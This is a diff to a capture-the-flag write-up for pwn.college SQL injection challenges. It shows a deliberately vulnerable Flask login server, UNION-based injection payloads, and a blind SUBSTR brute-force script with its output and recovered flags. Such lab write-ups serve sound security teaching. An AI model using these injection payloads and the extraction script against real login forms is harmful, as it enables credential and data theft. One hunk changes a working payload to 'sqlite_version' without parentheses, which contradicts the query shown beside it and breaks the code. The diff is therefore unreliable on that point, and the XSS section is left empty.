@@ -1374,6 +1374,7 @@ app.run("challenge.localhost", 80)
 
 In this challenge, the table name is randomized, so we first have to figure that out.
 
+### SQL injection
 #### Retrieving SQLite version
 
 The SQLite version can be retrieved using the following query:
@@ -1390,7 +1391,7 @@ query: 'admin" UNION SELECT sqlite_version()-- -'
 
 The resultant query will be:
 
-```
+```sql
 SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sqlite_version()-- -"
 ```
 
@@ -1399,7 +1400,7 @@ import requests
 
 url = "http://challenge.localhost:80"
 params = {
-    "query": 'admin" UNION SELECT sqlite_version()-- -'
+    "query": 'admin" UNION SELECT sqlite_version-- -'
 }
 response = requests.get(url, params = params)
 print(response.text)
@@ -1422,7 +1423,7 @@ admin</pre>
 For SQLite versions `3.33.0` and previous, the `sqlite_master` table contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.
 
 ```
-SELECT sql FROM sqlite_master
+SELECT sql FROM sqlite_master;
 ```
 
 If we provide the following request:
@@ -1433,7 +1434,7 @@ query: 'admin" UNION SELECT sql FROM sqlite_master-- -'
 
 The resultant query will be:
 
-```
+```sql
 SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sql FROM sqlite_master-- -"
 ```
 
@@ -1472,7 +1473,7 @@ query: 'admin" UNION SELECT password FROM users_4902969274-- -'
 
 The resultant query will be:
 
-```
+```sql
 SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT password FROM users_4902969274-- -"
 ```
 
@@ -1502,3 +1503,225 @@ pwn.college{AlwY4pMMjmQroxd9XEXlpIAKgEF.dJTOzMDL4ITM0EzW}
 ```
 
 &nbsp;
+
+## SQLi 5
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")
+
+
+@app.route("/", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+
+    return (
+        page
+        + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>Password:<input type=text name=password><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+    )
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+### SQL injection
+
+#### Blind attack
+Before we perform the attack we need to learn more about the `SUBSTR()` function.
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/ec609e62-def0-46f2-b58a-cb7d332e11ca)
+
+```
+## Extract the one character from the string starting at the first position
+SUBSTR("pwn.college", 1, 1)
+
+## Result:
+p
+```
+
+```
+## Extract the one character from the string starting at the second position
+SUBSTR("pwn.college", 2, 1)
+
+## Result:
+w
+```
+
+```
+## Extract the one character from the string starting at the third position
+SUBSTR("pwn.college", 3, 1)
+
+## Result:
+n
+```
+
+Now we have to write a script that loops over and checks the next byte with a set of characters.
+
+We also need to create an empty string.
+If the script finds the `Hello, {username}!` message, within the response, it will append the character to the flag string.
+
+```py title="~/script.py" showLineNumbers
+import string
+import requests
+
+searchspace = ''.join(chr(i) for i in range(32, 127)) 
+solution = ''
+url = "http://challenge.localhost:80"
+
+while True:
+    found = False
+    for char in searchspace:
+        payload = f"admin' AND SUBSTR(password, {len(solution)+1}, 1) = '{char}'-- -"
+        data = {
+            "username": payload,
+            "password": "irrelevant"
+        }
+
+        response = requests.post(url, data=data)
+
+        if "Hello" in response.text:
+            solution += char
+            print(f"[+] Found so far: {solution}")
+            found = True
+            break
+
+    if not found:
+        print("[*] Done. Final password:", solution)
+        break
+```
+
+```
+hacker@web-security~sqli-5:/$ python ~/script.py 
+[+] Found so far: p
+[+] Found so far: pw
+[+] Found so far: pwn
+[+] Found so far: pwn.
+[+] Found so far: pwn.c
+[+] Found so far: pwn.co
+[+] Found so far: pwn.col
+[+] Found so far: pwn.coll
+[+] Found so far: pwn.colle
+[+] Found so far: pwn.colleg
+[+] Found so far: pwn.college
+[+] Found so far: pwn.college{
+[+] Found so far: pwn.college{Q
+[+] Found so far: pwn.college{Qc
+[+] Found so far: pwn.college{Qcq
+[+] Found so far: pwn.college{QcqW
+[+] Found so far: pwn.college{QcqWG
+[+] Found so far: pwn.college{QcqWGp
+[+] Found so far: pwn.college{QcqWGpB
+[+] Found so far: pwn.college{QcqWGpBU
+[+] Found so far: pwn.college{QcqWGpBUx
+[+] Found so far: pwn.college{QcqWGpBUx2
+[+] Found so far: pwn.college{QcqWGpBUx29
+[+] Found so far: pwn.college{QcqWGpBUx29_
+[+] Found so far: pwn.college{QcqWGpBUx29_s
+[+] Found so far: pwn.college{QcqWGpBUx29_s2
+[+] Found so far: pwn.college{QcqWGpBUx29_s2h
+[+] Found so far: pwn.college{QcqWGpBUx29_s2hu
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huw
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwr
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwru
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruw
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwT
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTk
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkm
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmE
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEW
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWU
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.d
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dN
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNT
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTO
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOz
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzM
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMD
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4I
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4IT
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0E
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0Ez
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW
+[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW}
+[*] Done. Final password: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## XSS 1
+
+### Source code
+```
+
+```
